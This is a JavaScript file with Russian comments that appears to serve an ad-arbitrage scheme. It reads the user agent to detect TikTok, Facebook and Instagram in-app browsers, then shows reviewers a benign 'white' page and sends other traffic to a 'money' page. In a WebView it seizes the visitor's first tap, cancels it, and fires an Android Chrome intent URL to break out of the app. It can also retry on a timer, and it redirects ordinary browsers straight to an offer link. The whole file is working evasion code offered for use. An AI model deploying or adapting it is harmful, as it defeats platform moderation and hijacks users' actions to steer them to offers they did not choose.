(function (win, doc) {
  'use strict';

  var cfg = Object.assign({
    page: 'white',                 // 'money' или 'white' (дефолт — white)
    intentTarget: '',              // что открывать через intent
    cleanTarget: '',               // куда редиректить в нормальном браузере
    autoAttemptOnLoad: false,      // автопопытка только в WebView
    repeatEveryMs: 0,              // период повторных попыток (0 = без повторов)
    repeatMaxMs: 0,                // максимум времени для повторов
    userActionEvents: ['pointerdown', 'touchstart', 'click'],
    debug: false
  }, win.IntentBypassConfig || {});

  function log() {
    if (!cfg.debug || !win.console) return;
    var args = Array.prototype.slice.call(arguments);
    args.unshift('[intent-main]');
    console.log.apply(console, args);
  }

  var ua = (win.navigator && win.navigator.userAgent) || '';
  var isAndroid = /Android/i.test(ua);
  var isIOS     = /iPhone|iPad|iPod/i.test(ua);

  var isTikTok  = /TikTok|ttwebview|Bytedance|Aweme/i.test(ua);
  var isFB      = /FB_IAB|FBAN|FBAV|Instagram/i.test(ua);
  var isWVFlag  = /; wv\)/i.test(ua) || /Version\/\d+\.\d+ Mobile\/\S+ Safari\//i.test(ua);

  var isWebView = isTikTok || isFB || isWVFlag;

  var isChrome  = /Chrome/i.test(ua);
  var isAndroidChromeLike = isAndroid && (isChrome || isTikTok || isFB);

  log('env', { ua: ua, isAndroid: isAndroid, isIOS: isIOS, isWebView: isWebView, isAndroidChromeLike: isAndroidChromeLike });

  // Стрипуем antiHash, чтобы понимать "тот же" URL
  function stripAntiHash(url) {
    try {
      var u = new URL(url, win.location.origin);
      u.searchParams.delete('antiHash');
      return u.toString();
    } catch (e) {
      return url;
    }
  }

  // Безопасная навигация: не идём на тот же самый URL
  function safeNavigate(url) {
    if (!url) return;
    var current = win.location.href;
    var t1 = stripAntiHash(current);
    var t2 = stripAntiHash(url);
    if (t1 === t2) {
      log('safeNavigate: same URL, skip', t1);
      return;
    }
    log('safeNavigate →', url);
    try {
      win.location.href = url;
    } catch (e) {
      win.location.assign(url);
    }
  }

  function buildChromeIntent(intentUrl, fallbackUrl) {
    var fallback = fallbackUrl || intentUrl;
    return 'intent://navigate?url=' + encodeURIComponent(intentUrl) +
      '#Intent;scheme=googlechrome;package=com.android.chrome;' +
      'S.browser_fallback_url=' + encodeURIComponent(fallback) + ';end;';
  }

  function openExternalViaIntent() {
    var intentTarget = cfg.intentTarget;
    var cleanTarget  = cfg.cleanTarget || cfg.intentTarget;

    if (!intentTarget) {
      log('openExternalViaIntent: no intentTarget, abort');
      return;
    }

    // Если ЭТО НЕ webview — никакого intent
    if (!isWebView) {
      log('openExternalViaIntent: not a WebView, no intent');
      // На money-page вне webview мы делаем обычный редирект на cleanTarget
      if (cfg.page === 'money' && cleanTarget) {
        safeNavigate(cleanTarget);
      }
      return;
    }

    // Внутри WebView вызываем intent
    if (isAndroid && isAndroidChromeLike) {
      var chromeIntent = buildChromeIntent(intentTarget, cleanTarget);
      log('openExternalViaIntent: Android intent', chromeIntent);
      safeNavigate(chromeIntent);
      return;
    }

    if (isIOS) {
      // Для iOS можно вытащить в Safari простым https-редиректом
      log('openExternalViaIntent: iOS, open https', intentTarget);
      safeNavigate(intentTarget);
      return;
    }

    // Другие WebView — пробуем хотя бы чистую ссылку
    log('openExternalViaIntent: generic WebView, fallback clean', cleanTarget);
    if (cleanTarget) {
      safeNavigate(cleanTarget);
    }
  }

  function bindUserActionOnce(handler) {
    if (!cfg.userActionEvents || !cfg.userActionEvents.length) {
      cfg.userActionEvents = ['pointerdown', 'touchstart', 'click'];
    }
    var fired = false;

    function wrapper(ev) {
      if (fired) return;
      fired = true;
      try { ev && ev.preventDefault && ev.preventDefault(); } catch (e) {}
      handler();
    }

    cfg.userActionEvents.forEach(function (evt) {
      doc.addEventListener(evt, wrapper, { once: true, passive: false });
    });
  }

  function setupByPage() {
    // MONEY PAGE
    if (cfg.page === 'money') {
      if (isWebView) {
        // В WebView: любое действие пользователя → intent на текущую страницу (intentTarget),
        // а fallback в intent ведёт уже на offer_link (cleanTarget).
        log('setup: money + WebView → userAction -> intent');
        bindUserActionOnce(openExternalViaIntent);
      } else {
        // НЕ WebView: сразу один раз редиректим на cleanTarget (offer_link)
        if (cfg.cleanTarget) {
          log('setup: money + real browser → immediate redirect to cleanTarget');
          // Делаем это после полной загрузки, чтобы не ломать совсем уж всё
          if (doc.readyState === 'complete' || doc.readyState === 'interactive') {
            safeNavigate(cfg.cleanTarget);
          } else {
            doc.addEventListener('DOMContentLoaded', function () {
              safeNavigate(cfg.cleanTarget);
            });
          }
        }
      }
      return;
    }

    // WHITE PAGE (всё, что НЕ 'money')
    if (isWebView) {
      // В WebView: любое действие → intent на эту же страницу
      log('setup: white + WebView → userAction -> intent');
      bindUserActionOnce(openExternalViaIntent);
    } else {
      // В нормальном браузере на вайте НИЧЕГО не перехватываем
      log('setup: white + real browser → no interception');
    }
  }

  function setupAutoAttempt() {
    if (!cfg.autoAttemptOnLoad) {
      log('autoAttemptOnLoad = false, skip auto attempts');
      return;
    }
    if (!isWebView) {
      log('autoAttemptOnLoad: not a WebView, skip auto attempts');
      return;
    }

    var every = Number(cfg.repeatEveryMs) || 0;
    var max   = Number(cfg.repeatMaxMs) || 0;
    var start = Date.now();
    var done  = false;

    function tick() {
      if (done) return;
      openExternalViaIntent();
      if (!every || every <= 0) {
        done = true;
        return;
      }
      if (max && (Date.now() - start > max)) {
        log('autoAttempt: reached max duration, stop');
        done = true;
        return;
      }
      setTimeout(tick, every);
    }

    log('autoAttemptOnLoad: start, every=', every, 'max=', max);
    // Стартуем чуть позже, чтобы дать странице догрузиться
    setTimeout(tick, 300);
  }

  // === Инициализация ===
  setupByPage();
  setupAutoAttempt();

})(window, document);
